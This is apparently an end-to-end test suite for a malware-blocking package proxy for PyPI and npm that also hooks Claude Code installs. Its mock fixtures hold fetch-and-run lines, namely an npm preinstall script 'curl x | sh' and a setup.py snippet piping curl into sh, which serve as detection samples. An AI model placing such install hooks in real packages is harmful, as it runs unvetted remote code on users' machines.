//! End-to-end tests: the real server against a local mock registry, with a stand-in
//! scanner (the real one lives in `customs-scan`) and the untrained dev models.

use std::collections::{BTreeMap, HashMap};
use std::path::PathBuf;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use axum::extract::{Path, State};
use axum::http::StatusCode;
use axum::response::{IntoResponse, Response};
use axum::routing::get;
use axum::{Json, Router};
use chrono::Utc;
use customs::config::{Mode, Policy};
use customs::engine::{Engine, EngineConfig, Limits, ScanFn};
use customs::metrics::Metrics;
use customs_model::Models;
use customs_scan::{Ecosystem, Evidence, ScanReport};
use serde_json::{json, Value};
use tokio::net::TcpListener;

// ------------------------------------------------------------------ mock registry

#[derive(Default)]
struct MockState {
    base: String,
    hits: Mutex<HashMap<String, usize>>,
    file_delay_ms: AtomicUsize,
}

impl MockState {
    fn hit(&self, key: &str) {
        *self
            .hits
            .lock()
            .unwrap()
            .entry(key.to_string())
            .or_default() += 1;
    }
    fn hits(&self, key: &str) -> usize {
        self.hits.lock().unwrap().get(key).copied().unwrap_or(0)
    }
}

type Mock = Arc<MockState>;

/// Packages the mock knows: (name, version, archive bytes, upload time).
fn pypi_packages() -> Vec<(&'static str, &'static str, &'static [u8], String)> {
    let old = "2020-01-01T00:00:00.000000Z".to_string();
    let fresh = (Utc::now() - chrono::Duration::hours(2)).to_rfc3339();
    vec![
        ("goodpkg", "1.0.0", b"benign archive", old.clone()),
        ("goodpkg", "1.1.0", b"benign archive v1.1", old.clone()),
        ("evilpkg", "0.0.1", b"EVIL archive", old.clone()),
        ("reqeusts", "2.0.0", b"benign typosquat", old.clone()),
        ("slowpkg", "1.0.0", b"benign slow", old),
        ("newpkg", "1.0.0", b"benign but new", fresh),
    ]
}

fn file_name(name: &str, version: &str) -> String {
    format!("{name}-{version}.tar.gz")
}

async fn simple_page(State(m): State<Mock>, Path(project): Path<String>) -> Response {
    let links: Vec<String> = pypi_packages()
        .into_iter()
        .filter(|p| p.0 == project)
        .map(|(n, v, _, _)| {
            let f = file_name(n, v);
            format!(
                r#"<a href="{}/files/packages/ab/cd/{f}#sha256=00">{f}</a><br/>"#,
                m.base
            )
        })
        .collect();
    if links.is_empty() {
        return (StatusCode::NOT_FOUND, "Not Found").into_response();
    }
    (
        [("content-type", "text/html")],
        format!("<html><body>{}</body></html>", links.join("\n")),
    )
        .into_response()
}

fn pypi_file_json(m: &MockState, n: &str, v: &str, t: &str, bytes: &[u8]) -> Value {
    json!({
        "filename": file_name(n, v),
        "url": format!("{}/files/packages/ab/cd/{}", m.base, file_name(n, v)),
        "upload_time_iso_8601": t,
        "packagetype": "sdist",
        "size": bytes.len(),
        "digests": {"sha256": "00"},
        "yanked": false,
    })
}

async fn pypi_json(State(m): State<Mock>, Path(name): Path<String>) -> Response {
    let pkgs: Vec<_> = pypi_packages()
        .into_iter()
        .filter(|p| p.0 == name)
        .collect();
    if pkgs.is_empty() {
        return (StatusCode::NOT_FOUND, Json(json!({"message": "Not Found"}))).into_response();
    }
    let mut releases = serde_json::Map::new();
    for (n, v, b, t) in &pkgs {
        releases.insert(v.to_string(), json!([pypi_file_json(&m, n, v, t, b)]));
    }
    let latest = pkgs.last().unwrap().1;
    Json(json!({"info": {"name": name, "version": latest}, "releases": releases})).into_response()
}

async fn pypi_version_json(
    State(m): State<Mock>,
    Path((name, version)): Path<(String, String)>,
) -> Response {
    match pypi_packages()
        .into_iter()
        .find(|p| p.0 == name && p.1 == version)
    {
        Some((n, v, b, t)) => Json(
            json!({"info": {"name": n, "version": v}, "urls": [pypi_file_json(&m, n, v, &t, b)]}),
        )
        .into_response(),
        None => (StatusCode::NOT_FOUND, "{}").into_response(),
    }
}

async fn files(State(m): State<Mock>, Path(path): Path<String>) -> Response {
    m.hit(&path);
    let delay = m.file_delay_ms.load(Ordering::SeqCst);
    if delay > 0 {
        tokio::time::sleep(Duration::from_millis(delay as u64)).await;
    }
    let file = path.rsplit('/').next().unwrap_or("");
    for (n, v, b, _) in pypi_packages() {
        if file_name(n, v) == file {
            return b.to_vec().into_response();
        }
    }
    StatusCode::NOT_FOUND.into_response()
}

/// npm packages: (name, version, bytes, published, scripts).
fn npm_packages() -> Vec<(&'static str, &'static str, &'static [u8], String, Value)> {
    let old = "2019-05-01T00:00:00.000Z".to_string();
    let fresh = (Utc::now() - chrono::Duration::hours(1)).to_rfc3339();
    vec![
        (
            "@scope/lib",
            "1.2.3",
            b"benign scoped",
            old.clone(),
            json!({}),
        ),
        (
            "plainlib",
            "0.1.0",
            b"benign plain",
            old.clone(),
            json!({"test": "jest"}),
        ),
        (
            "freshpkg",
            "1.0.0",
            b"benign fresh",
            fresh,
            json!({"postinstall": "node setup.js"}),
        ),
        (
            "evil-js",
            "6.6.6",
            b"EVIL js",
            old,
            json!({"preinstall": "curl x | sh"}),
        ),
    ]
}

async fn npm_doc(State(m): State<Mock>, Path(rest): Path<String>) -> Response {
    if let Some((name, file)) = rest.split_once("/-/") {
        m.hit(&format!("npm:{file}"));
        for (n, v, b, _, _) in npm_packages() {
            let bare = n.rsplit('/').next().unwrap();
            if n == name && file == format!("{bare}-{v}.tgz") {
                return b.to_vec().into_response();
            }
        }
        return StatusCode::NOT_FOUND.into_response();
    }
    let name = rest.replace("%2f", "/").replace("%2F", "/");
    let Some((n, v, _, t, scripts)) = npm_packages().into_iter().find(|p| p.0 == name) else {
        return (StatusCode::NOT_FOUND, Json(json!({"error": "Not found"}))).into_response();
    };
    let bare = n.rsplit('/').next().unwrap();
    Json(json!({
        "name": n,
        "dist-tags": {"latest": v},
        "time": {v: t, "created": t},
        "versions": {v: {
            "name": n, "version": v, "scripts": scripts,
            "dist": {"tarball": format!("{}/npm/{n}/-/{bare}-{v}.tgz", m.base), "shasum": "x"}
        }}
    }))
    .into_response()
}

async fn start_mock() -> Mock {
    let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let base = format!("http://{}", listener.local_addr().unwrap());
    let state = Arc::new(MockState {
        base,
        ..Default::default()
    });
    let app = Router::new()
        .route("/simple/{project}/", get(simple_page))
        .route("/pypi/{name}/json", get(pypi_json))
        .route("/pypi/{name}/{version}/json", get(pypi_version_json))
        .route("/files/{*path}", get(files))
        .route("/npm/{*rest}", get(npm_doc))
        .with_state(state.clone());
    tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
    state
}

// ------------------------------------------------------------------ harness

/// Stand-in scanner: archives containing `EVIL` light up the install-time indicators the
/// dev tree model keys on; everything else gets benign zero features.
fn fake_scanner(calls: Arc<AtomicUsize>) -> ScanFn {
    Arc::new(move |bytes: &[u8], filename: &str, eco: Ecosystem| {
        calls.fetch_add(1, Ordering::SeqCst);
        let evil = bytes.windows(4).any(|w| w == b"EVIL");
        let mut features = BTreeMap::new();
        for f in [
            "inst_download_exec",
            "inst_exfil_endpoint",
            "inst_proc_exec",
            "inst_network",
        ] {
            features.insert(f.to_string(), if evil { 2.0 } else { 0.0 });
        }
        let mut install_surface = vec!["setup.py".to_string()];
        if bytes.ends_with(b"fresh") {
            install_surface.push("package.json:scripts.postinstall".into());
        }
        Ok(ScanReport {
            schema_version: 1,
            ecosystem: eco,
            archive: filename.to_string(),
            sha256: String::new(),
            name: None,
            version: None,
            features,
            evidence: if evil {
                vec![Evidence {
                    indicator: "download_exec".into(),
                    file: "setup.py".into(),
                    line: 3,
                    snippet: "os.system('curl http://x | sh')".into(),
                }]
            } else {
                vec![]
            },
            install_surface,
            tokens: None,
            errors: vec![],
        })
    })
}

fn dev_models() -> Models {
    let dir = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../models/dev");
    Models::load(dir).unwrap()
}

struct Harness {
    base: String,
    mock: Mock,
    engine: Arc<Engine>,
    scans: Arc<AtomicUsize>,
    http: reqwest::Client,
    shutdown: Option<tokio::sync::oneshot::Sender<()>>,
    server: Option<tokio::task::JoinHandle<anyhow::Result<()>>>,
    _dir: tempfile::TempDir,
}

impl Harness {
    async fn start(edit: impl FnOnce(&mut Policy)) -> Self {
        Self::start_with_ui(edit, None).await
    }

    async fn start_with_ui(edit: impl FnOnce(&mut Policy), ui: Option<PathBuf>) -> Self {
        let mock = start_mock().await;
        let dir = tempfile::tempdir().unwrap();
        let mut policy = Policy::default();
        policy.upstream.pypi_simple = format!("{}/simple", mock.base);
        policy.upstream.pypi_files = format!("{}/files", mock.base);
        policy.upstream.pypi_json = format!("{}/pypi", mock.base);
        policy.upstream.npm = format!("{}/npm", mock.base);
        edit(&mut policy);
        let scans = Arc::new(AtomicUsize::new(0));
        let engine = Engine::new(EngineConfig {
            data_dir: dir.path().to_path_buf(),
            models: dev_models(),
            policy,
            policy_path: dir.path().join("policy.toml"),
            scanner: fake_scanner(scans.clone()),
            limits: Limits::default(),
            metrics: Arc::new(Metrics::new()),
        })
        .unwrap();
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let base = format!("http://{}", listener.local_addr().unwrap());
        let (tx, rx) = tokio::sync::oneshot::channel::<()>();
        let server = tokio::spawn(customs::server::serve_on(
            listener,
            engine.clone(),
            ui,
            async move {
                let _ = rx.await;
            },
        ));
        Self {
            base,
            mock,
            engine,
            scans,
            http: reqwest::Client::builder().no_proxy().build().unwrap(),
            shutdown: Some(tx),
            server: Some(server),
            _dir: dir,
        }
    }

    async fn get(&self, path: &str) -> reqwest::Response {
        self.http
            .get(format!("{}{path}", self.base))
            .send()
            .await
            .unwrap()
    }

    async fn check(&self, eco: &str, name: &str, version: Option<&str>) -> (u16, Value) {
        let r = self
            .http
            .post(format!("{}/api/check", self.base))
            .json(&json!({"ecosystem": eco, "name": name, "version": version, "client": "test"}))
            .send()
            .await
            .unwrap();
        (r.status().as_u16(), r.json().await.unwrap())
    }

    async fn events(&self) -> Vec<Value> {
        self.get("/api/events").await.json().await.unwrap()
    }

    async fn stop(mut self) {
        let _ = self.shutdown.take().unwrap().send(());
        tokio::time::timeout(Duration::from_secs(10), self.server.take().unwrap())
            .await
            .expect("graceful shutdown timed out")
            .unwrap()
            .unwrap();
    }
}

fn pypi_file_path(name: &str, version: &str) -> String {
    format!("/pypi/files/packages/ab/cd/{}", file_name(name, version))
}

// ------------------------------------------------------------------ tests

#[tokio::test(flavor = "multi_thread")]
async fn pypi_simple_page_is_rewritten_and_allowed_file_streams() {
    let h = Harness::start(|_| {}).await;
    let page = h.get("/pypi/simple/GoodPkg/").await;
    assert_eq!(page.status(), 200);
    let html = page.text().await.unwrap();
    assert!(
        html.contains(&format!(
            "{}/pypi/files/packages/ab/cd/goodpkg-1.0.0.tar.gz#sha256=00",
            h.base
        )),
        "{html}"
    );
    assert!(!html.contains(&h.mock.base));

    let r = h.get(&pypi_file_path("goodpkg", "1.0.0")).await;
    assert_eq!(r.status(), 200);
    assert_eq!(r.headers()["x-customs-decision"], "allow");
    assert_eq!(r.bytes().await.unwrap().as_ref(), b"benign archive");

    let ev = h.events().await;
    assert_eq!(ev.len(), 1);
    assert_eq!(ev[0]["kind"], "install");
    assert_eq!(ev[0]["decision"], "allow");
    assert_eq!(ev[0]["name"], "goodpkg");
    assert_eq!(ev[0]["version"], "1.0.0");
    let v: Value = h
        .get(&format!("/api/verdicts/{}", ev[0]["verdict_id"]))
        .await
        .json()
        .await
        .unwrap();
    assert_eq!(v["id"], ev[0]["verdict_id"]);
    assert_eq!(v["artifact"], "goodpkg-1.0.0.tar.gz");
    assert_eq!(v["model_version"], "dev-untrained");
    assert!(v["scores"]["code_gbdt"].as_f64().unwrap() < 0.5);
    assert_eq!(v["thresholds"]["block"], 0.9);
    assert_eq!(v["cached"], false);

    // Second download: served from cache, scan not repeated.
    let r = h.get(&pypi_file_path("goodpkg", "1.0.0")).await;
    assert_eq!(r.status(), 200);
    assert_eq!(h.mock.hits("packages/ab/cd/goodpkg-1.0.0.tar.gz"), 1);
    assert_eq!(h.scans.load(Ordering::SeqCst), 1);
    let ev = h.events().await;
    let v: Value = h
        .get(&format!("/api/verdicts/{}", ev[0]["verdict_id"]))
        .await
        .json()
        .await
        .unwrap();
    assert_eq!(v["cached"], true);
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn pypi_malicious_file_is_blocked_with_explanation() {
    let h = Harness::start(|_| {}).await;
    let r = h.get(&pypi_file_path("evilpkg", "0.0.1")).await;
    assert_eq!(r.status(), 403);
    let reason = r.status().canonical_reason();
    assert_eq!(reason, Some("Forbidden"));
    assert_eq!(r.headers()["x-customs-decision"], "block");
    let body = r.text().await.unwrap();
    assert!(
        body.starts_with("Customs blocked pypi package evilpkg 0.0.1"),
        "{body}"
    );
    assert!(
        body.contains("Downloads and executes a payload at install time"),
        "{body}"
    );
    assert!(body.contains("/api/verdicts/"), "{body}");

    let ev = h.events().await;
    assert_eq!(ev[0]["decision"], "block");
    let v: Value = h
        .get(&format!("/api/verdicts/{}", ev[0]["verdict_id"]))
        .await
        .json()
        .await
        .unwrap();
    assert_eq!(v["model_decision"], "block");
    assert_eq!(v["reasons"][0]["feature"], "inst_download_exec");
    assert_eq!(v["evidence"][0]["file"], "setup.py");
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn raw_reason_phrase_names_the_rule() {
    let h = Harness::start(|p| p.deny = vec!["pypi:goodpkg".into()]).await;
    let path = pypi_file_path("goodpkg", "1.0.0");
    let mut s = tokio::net::TcpStream::connect(h.base.trim_start_matches("http://"))
        .await
        .unwrap();
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    s.write_all(format!("GET {path} HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n").as_bytes())
        .await
        .unwrap();
    let mut buf = Vec::new();
    s.read_to_end(&mut buf).await.unwrap();
    let text = String::from_utf8_lossy(&buf);
    let status_line = text.lines().next().unwrap();
    assert_eq!(
        status_line,
        "HTTP/1.1 403 Blocked by Customs: deny: pypi:goodpkg is on the deny list"
    );
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn typosquat_name_is_warned_but_served() {
    let h = Harness::start(|_| {}).await;
    let r = h.get(&pypi_file_path("reqeusts", "2.0.0")).await;
    assert_eq!(r.status(), 200);
    assert_eq!(r.headers()["x-customs-decision"], "warn");
    let (status, v) = h.check("pypi", "reqeusts", None).await;
    assert_eq!(status, 200);
    assert_eq!(v["decision"], "warn");
    let labels: Vec<&str> = v["reasons"]
        .as_array()
        .unwrap()
        .iter()
        .map(|r| r["label"].as_str().unwrap())
        .collect();
    assert!(
        labels.contains(&"1 edit from popular package 'requests'"),
        "{labels:?}"
    );
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn new_versions_hit_min_age() {
    let h = Harness::start(|_| {}).await;
    let r = h.get(&pypi_file_path("newpkg", "1.0.0")).await;
    assert_eq!(r.status(), 403);
    let body = r.text().await.unwrap();
    assert!(
        body.contains("min_age_days: published 2 hours ago (policy: 3 days)"),
        "{body}"
    );
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn npm_packument_rewrite_and_tarballs() {
    let h = Harness::start(|_| {}).await;
    for path in ["/npm/@scope%2flib", "/npm/@scope/lib", "/npm/@scope%2Flib"] {
        let r = h.get(path).await;
        assert_eq!(r.status(), 200, "{path}");
        let v: Value = r.json().await.unwrap();
        assert_eq!(
            v["versions"]["1.2.3"]["dist"]["tarball"],
            format!("{}/npm/@scope/lib/-/lib-1.2.3.tgz", h.base),
            "{path}"
        );
    }
    let r = h.get("/npm/@scope/lib/-/lib-1.2.3.tgz").await;
    assert_eq!(r.status(), 200);
    assert_eq!(r.bytes().await.unwrap().as_ref(), b"benign scoped");
    let r = h.get("/npm/plainlib/-/plainlib-0.1.0.tgz").await;
    assert_eq!(r.status(), 200);

    let r = h.get("/npm/evil-js/-/evil-js-6.6.6.tgz").await;
    assert_eq!(r.status(), 403);
    let err: Value = r.json().await.unwrap();
    assert!(err["error"]
        .as_str()
        .unwrap()
        .contains("Customs blocked npm package evil-js 6.6.6"));

    // Young package with a postinstall script: blocked by both age rules.
    let r = h.get("/npm/freshpkg/-/freshpkg-1.0.0.tgz").await;
    assert_eq!(r.status(), 403);
    let err: Value = r.json().await.unwrap();
    let msg = err["error"].as_str().unwrap();
    assert!(msg.contains("min_age_days"), "{msg}");
    assert!(
        msg.contains("block_install_scripts_from_new: runs install scripts (postinstall)"),
        "{msg}"
    );

    let r = h.get("/npm/does-not-exist").await;
    assert_eq!(r.status(), 404);
    let ev = h.events().await;
    assert_eq!(ev[0]["kind"], "nonexistent_package");
    assert_eq!(ev[0]["name"], "does-not-exist");
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn warn_only_age_rule_with_install_scripts() {
    let h = Harness::start(|p| p.min_age_severity = customs::config::AgeSeverity::Warn).await;
    let (_, v) = h.check("npm", "freshpkg", None).await;
    assert_eq!(v["decision"], "block");
    let rules: Vec<&str> = v["policy_hits"]
        .as_array()
        .unwrap()
        .iter()
        .map(|h| h.as_str_rule())
        .collect();
    assert_eq!(
        rules,
        vec!["min_age_days", "block_install_scripts_from_new"]
    );
    h.stop().await;
}

trait RuleName {
    fn as_str_rule(&self) -> &str;
}
impl RuleName for Value {
    fn as_str_rule(&self) -> &str {
        self["rule"].as_str().unwrap()
    }
}

#[tokio::test(flavor = "multi_thread")]
async fn nonexistent_packages() {
    let h = Harness::start(|_| {}).await;
    let r = h.get("/pypi/simple/nope-not-here/").await;
    assert_eq!(r.status(), 404);
    let ev = h.events().await;
    assert_eq!(ev[0]["kind"], "nonexistent_package");
    assert_eq!(ev[0]["decision"], "block");

    let (status, body) = h.check("pypi", "nope-not-here", None).await;
    assert_eq!(status, 404);
    assert_eq!(body["code"], "nonexistent_package");
    assert!(body["error"]
        .as_str()
        .unwrap()
        .contains("does not exist on PyPI"));
    assert_eq!(body["verdict"]["decision"], "block");
    assert!(body["verdict"]["id"].is_i64());
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn check_resolves_versions() {
    let h = Harness::start(|_| {}).await;
    let (s, v) = h.check("pypi", "goodpkg", None).await;
    assert_eq!(s, 200);
    assert_eq!(v["version"], "1.1.0");
    let (_, v) = h.check("pypi", "goodpkg", Some("<1.1")).await;
    assert_eq!(v["version"], "1.0.0");
    let (_, v) = h.check("pypi", "goodpkg", Some("==1.0.0")).await;
    assert_eq!(v["version"], "1.0.0");
    let (s, v) = h.check("pypi", "goodpkg", Some(">=9")).await;
    assert_eq!(s, 422, "{v}");
    let (_, v) = h.check("npm", "@scope/lib", Some("^1")).await;
    assert_eq!(v["version"], "1.2.3");
    assert_eq!(v["decision"], "allow");
    let (s, _) = h.check("cargo", "serde", None).await;
    assert_eq!(s, 400);
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn concurrent_requests_scan_once() {
    let h = Harness::start(|_| {}).await;
    h.mock.file_delay_ms.store(400, Ordering::SeqCst);
    let path = pypi_file_path("slowpkg", "1.0.0");
    let mut tasks = Vec::new();
    for _ in 0..8 {
        let (http, url) = (h.http.clone(), format!("{}{path}", h.base));
        tasks.push(tokio::spawn(async move {
            let r = http.get(url).send().await.unwrap();
            let id = r.headers()["x-customs-verdict"]
                .to_str()
                .unwrap()
                .to_string();
            (r.status().as_u16(), id, r.bytes().await.unwrap())
        }));
    }
    let mut ids = Vec::new();
    for t in tasks {
        let (status, id, body) = t.await.unwrap();
        assert_eq!(status, 200);
        assert_eq!(body.as_ref(), b"benign slow");
        ids.push(id);
    }
    assert_eq!(h.mock.hits("packages/ab/cd/slowpkg-1.0.0.tar.gz"), 1);
    assert_eq!(h.scans.load(Ordering::SeqCst), 1);
    assert!(ids.windows(2).all(|w| w[0] == w[1]), "{ids:?}");
    let metrics = h.get("/metrics").await.text().await.unwrap();
    assert!(
        metrics.contains("customs_singleflight_joins_total 7"),
        "{metrics}"
    );
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn monitor_mode_serves_blocked_artifacts() {
    let h = Harness::start(|p| p.mode = Mode::Monitor).await;
    let r = h.get(&pypi_file_path("evilpkg", "0.0.1")).await;
    assert_eq!(r.status(), 200);
    assert_eq!(r.headers()["x-customs-decision"], "block");
    assert_eq!(r.bytes().await.unwrap().as_ref(), b"EVIL archive");
    let ev = h.events().await;
    assert_eq!(ev[0]["decision"], "block");
    let v: Value = h
        .get(&format!("/api/verdicts/{}", ev[0]["verdict_id"]))
        .await
        .json()
        .await
        .unwrap();
    assert_eq!(v["mode"], "monitor");
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn sse_delivers_events() {
    let h = Harness::start(|_| {}).await;
    let mut stream = h.get("/api/events/stream").await;
    assert_eq!(stream.headers()["content-type"], "text/event-stream");
    let (_, v) = h.check("pypi", "goodpkg", Some("1.0.0")).await;
    let mut buf = String::new();
    let deadline = tokio::time::Instant::now() + Duration::from_secs(5);
    while !buf.contains("\n\n") {
        let chunk = tokio::time::timeout_at(deadline, stream.chunk())
            .await
            .expect("no SSE frame")
            .unwrap()
            .unwrap();
        buf.push_str(&String::from_utf8_lossy(&chunk));
    }
    assert!(buf.starts_with("event: install\n"), "{buf}");
    let data = buf.lines().find_map(|l| l.strip_prefix("data: ")).unwrap();
    let ev: Value = serde_json::from_str(data).unwrap();
    assert_eq!(ev["kind"], "check");
    assert_eq!(ev["verdict_id"], v["id"]);
    assert_eq!(ev["client"], "test");
    // Shutdown must not hang on the open stream.
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn policy_api_validates_and_persists() {
    let h = Harness::start(|_| {}).await;
    let mut p: Value = h.get("/api/policy").await.json().await.unwrap();
    assert_eq!(p["mode"], "enforce");
    assert_eq!(p["warn_threshold"], "model");
    p["deny"] = json!(["pypi:goodpkg"]);
    p["block_threshold"] = json!(0.8);
    let r = h
        .http
        .put(format!("{}/api/policy", h.base))
        .json(&p)
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 200);
    let saved = std::fs::read_to_string(h.engine.policy_path()).unwrap();
    assert!(saved.contains("block_threshold = 0.8"), "{saved}");
    assert!(saved.contains("\"pypi:goodpkg\""), "{saved}");
    let r = h.get(&pypi_file_path("goodpkg", "1.0.0")).await;
    assert_eq!(r.status(), 403);

    p["warn_threshold"] = json!(1.5);
    let r = h
        .http
        .put(format!("{}/api/policy", h.base))
        .json(&p)
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 400);
    let e: Value = r.json().await.unwrap();
    assert_eq!(e["errors"][0]["field"], "warn_threshold");
    let r = h
        .http
        .put(format!("{}/api/policy", h.base))
        .body(r#"{"mode": "strict"}"#)
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 400);
    // The bad updates did not change the active policy.
    let now: Value = h.get("/api/policy").await.json().await.unwrap();
    assert_eq!(now["block_threshold"], 0.8);
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn events_filters_stats_model_metrics_health() {
    let h = Harness::start(|_| {}).await;
    h.get(&pypi_file_path("goodpkg", "1.0.0")).await;
    h.get(&pypi_file_path("evilpkg", "0.0.1")).await;
    h.get("/npm/plainlib/-/plainlib-0.1.0.tgz").await;
    let ev: Vec<Value> = h
        .get("/api/events?decision=block")
        .await
        .json()
        .await
        .unwrap();
    assert_eq!(ev.len(), 1);
    assert_eq!(ev[0]["name"], "evilpkg");
    let ev: Vec<Value> = h
        .get("/api/events?ecosystem=npm")
        .await
        .json()
        .await
        .unwrap();
    assert_eq!(ev.len(), 1);
    let ev: Vec<Value> = h
        .get("/api/events?q=PKG&limit=1")
        .await
        .json()
        .await
        .unwrap();
    assert_eq!(ev.len(), 1);
    let older: Vec<Value> = h
        .get(&format!("/api/events?q=pkg&before={}", ev[0]["id"]))
        .await
        .json()
        .await
        .unwrap();
    assert_eq!(older.len(), 1);
    assert_eq!(older[0]["name"], "goodpkg");

    let s: Value = h.get("/api/stats").await.json().await.unwrap();
    assert_eq!(s["total"], 3);
    assert_eq!(s["by_decision"]["block"], 1);
    assert_eq!(s["by_ecosystem"]["pypi"]["allow"], 1);
    assert_eq!(s["by_kind"]["install"], 3);
    assert_eq!(s["blocks_per_day"].as_array().unwrap().len(), 30);
    assert_eq!(s["blocks_per_day"][29]["count"], 1);
    assert_eq!(s["top_reasons"][0]["feature"], "inst_download_exec");

    let m: Value = h.get("/api/model").await.json().await.unwrap();
    assert_eq!(m["model_version"], "dev-untrained");
    assert_eq!(m["feature_schema_version"], 1);
    assert_eq!(m["untrained"], true);
    assert_eq!(m["thresholds"]["warn"], 0.5);
    assert_eq!(m["components"]["code_gbdt"]["loaded"], true);

    let metrics = h.get("/metrics").await.text().await.unwrap();
    assert!(
        metrics
            .contains(r#"customs_http_requests_total{route="/pypi/files/{*path}",status="403"} 1"#),
        "{metrics}"
    );
    assert!(metrics.contains(r#"customs_verdicts_total{decision="block",ecosystem="pypi"} 1"#));
    assert!(metrics.contains("customs_scan_duration_seconds_count 3"));
    assert!(metrics.contains(r#"customs_upstream_fetch_duration_seconds_count{kind="artifact"} 3"#));

    let health: Value = h.get("/healthz").await.json().await.unwrap();
    assert_eq!(health["status"], "ok");
    let r = h.get("/api/nope").await;
    assert_eq!(r.status(), 404);
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn cors_allows_only_the_vite_dev_origin() {
    let h = Harness::start(|_| {}).await;
    let r = h
        .http
        .get(format!("{}/api/stats", h.base))
        .header("origin", "http://localhost:5173")
        .send()
        .await
        .unwrap();
    assert_eq!(
        r.headers()["access-control-allow-origin"],
        "http://localhost:5173"
    );
    let r = h
        .http
        .get(format!("{}/api/stats", h.base))
        .header("origin", "http://evil.example")
        .send()
        .await
        .unwrap();
    assert!(r.headers().get("access-control-allow-origin").is_none());
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn dashboard_serving() {
    let h = Harness::start(|_| {}).await;
    let body = h.get("/").await.text().await.unwrap();
    assert!(body.contains("dashboard is not built"));
    h.stop().await;

    let ui = tempfile::tempdir().unwrap();
    std::fs::write(ui.path().join("index.html"), "<html>SPA</html>").unwrap();
    std::fs::create_dir(ui.path().join("assets")).unwrap();
    std::fs::write(ui.path().join("assets/app.js"), "console.log(1)").unwrap();
    let h = Harness::start_with_ui(|_| {}, Some(ui.path().to_path_buf())).await;
    assert_eq!(h.get("/").await.text().await.unwrap(), "<html>SPA</html>");
    assert_eq!(
        h.get("/assets/app.js").await.text().await.unwrap(),
        "console.log(1)"
    );
    let r = h.get("/verdicts/12").await;
    assert_eq!(r.status(), 200);
    assert_eq!(r.text().await.unwrap(), "<html>SPA</html>");
    h.stop().await;
}

/// Run the real binary as Claude Code would.
fn run_hook(
    server: &str,
    command: &str,
    cwd: &std::path::Path,
    extra: &[&str],
) -> (String, String, i32) {
    use std::io::Write;
    use std::process::{Command, Stdio};
    let input = json!({
        "session_id": "test",
        "transcript_path": "/tmp/t.jsonl",
        "cwd": cwd,
        "permission_mode": "default",
        "hook_event_name": "PreToolUse",
        "tool_name": "Bash",
        "tool_input": {"command": command, "description": "install"},
    });
    let mut child = Command::new(env!("CARGO_BIN_EXE_customs"))
        .args(["hook", "claude-code", "--server", server])
        .args(extra)
        .env("CUSTOMS_DATA_DIR", cwd.join("hook-data"))
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap();
    child
        .stdin
        .take()
        .unwrap()
        .write_all(input.to_string().as_bytes())
        .unwrap();
    let out = child.wait_with_output().unwrap();
    (
        String::from_utf8_lossy(&out.stdout).into_owned(),
        String::from_utf8_lossy(&out.stderr).into_owned(),
        out.status.code().unwrap_or(-1),
    )
}

#[tokio::test(flavor = "multi_thread")]
async fn claude_code_hook_end_to_end() {
    let h = Harness::start(|_| {}).await;
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("requirements.txt"),
        "goodpkg==1.0.0\nevilpkg\n",
    )
    .unwrap();
    let base = h.base.clone();
    let cwd = dir.path().to_path_buf();
    let results = tokio::task::spawn_blocking(move || {
        vec![
            run_hook(
                &base,
                "cd /x && FOO=1 pip install 'evilpkg==0.0.1'",
                &cwd,
                &[],
            ),
            run_hook(
                &base,
                "pip install goodpkg && npm i @scope/lib@^1",
                &cwd,
                &[],
            ),
            run_hook(&base, "pip install reqeusts", &cwd, &[]),
            run_hook(
                &base,
                "python -m pip install -r requirements.txt",
                &cwd,
                &[],
            ),
            run_hook(&base, "pip install nope-not-here", &cwd, &[]),
            run_hook(&base, "git status", &cwd, &[]),
        ]
    })
    .await
    .unwrap();

    let decision = |out: &str| -> Value { serde_json::from_str(out.trim()).unwrap() };
    let (out, _, code) = &results[0];
    assert_eq!(*code, 0);
    let d = decision(out);
    assert_eq!(d["hookSpecificOutput"]["hookEventName"], "PreToolUse");
    assert_eq!(d["hookSpecificOutput"]["permissionDecision"], "deny");
    let reason = d["hookSpecificOutput"]["permissionDecisionReason"]
        .as_str()
        .unwrap();
    assert!(reason.contains("pypi:evilpkg 0.0.1"), "{reason}");
    assert!(
        reason.contains("Downloads and executes a payload"),
        "{reason}"
    );

    assert_eq!(
        results[1].0.trim(),
        "",
        "allowed installs print nothing: {:?}",
        results[1]
    );
    assert_eq!(results[1].2, 0);

    assert_eq!(
        decision(&results[2].0)["hookSpecificOutput"]["permissionDecision"],
        "ask"
    );
    let d = decision(&results[3].0);
    assert_eq!(d["hookSpecificOutput"]["permissionDecision"], "deny");
    let d = decision(&results[4].0);
    let reason = d["hookSpecificOutput"]["permissionDecisionReason"]
        .as_str()
        .unwrap();
    assert!(reason.contains("does not exist on PyPI"), "{reason}");
    assert_eq!(results[5].0, "");

    // The server recorded the hook's checks.
    let ev = h.events().await;
    assert!(ev.iter().any(|e| e["client"] == "claude-code-hook"));
    h.stop().await;
}

